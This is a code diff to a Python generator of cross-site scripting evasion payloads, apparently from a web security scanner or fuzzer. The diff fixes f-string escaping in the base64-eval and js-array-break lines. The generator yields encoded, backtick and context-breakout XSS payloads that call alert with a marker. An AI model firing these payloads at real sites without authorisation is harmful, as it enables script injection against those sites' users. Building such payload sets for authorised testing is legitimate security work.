@@ -505,7 +505,8 @@ def generate_xss_evasion_payloads(
     # ── Phase 5: Encoding-based bypass ──
     yield f'<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(&#39;{m}&#39;)">', "html-entity-alert"
     yield f'<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074("{m}")>',     "unicode-escape"
-    yield f'<img src=x onerror=eval(atob(\'{_b64("alert(\\\"" + m + "\\\")")}\'))>', "base64-eval"
+    b64_alert = _b64(f'alert("{m}")')
+    yield f'<img src=x onerror=eval(atob(\'{b64_alert}\'))>', "base64-eval"
 
     # ── Phase 6: Backtick / Template literal ──
     yield f'<script>alert`{m}`</script>',                          "backtick-call"
@@ -525,7 +526,7 @@ def generate_xss_evasion_payloads(
     yield f'"-alert("{m}")-"',                                     "js-string-break"
     yield f"'-alert('{m}')-'",                                     "js-string-break2"
     yield f'}};alert("{m}");//',                                   "js-block-break"
-    yield f']};alert("{m}");//',                                   "js-array-break"
+    yield f']}};alert("{m}");//',                                  "js-array-break"
     yield f'</script><script>alert("{m}")</script>',               "script-break"
     yield f'</style><script>alert("{m}")</script>',                "style-break"
     yield f'</title><script>alert("{m}")</script>',                "title-break"
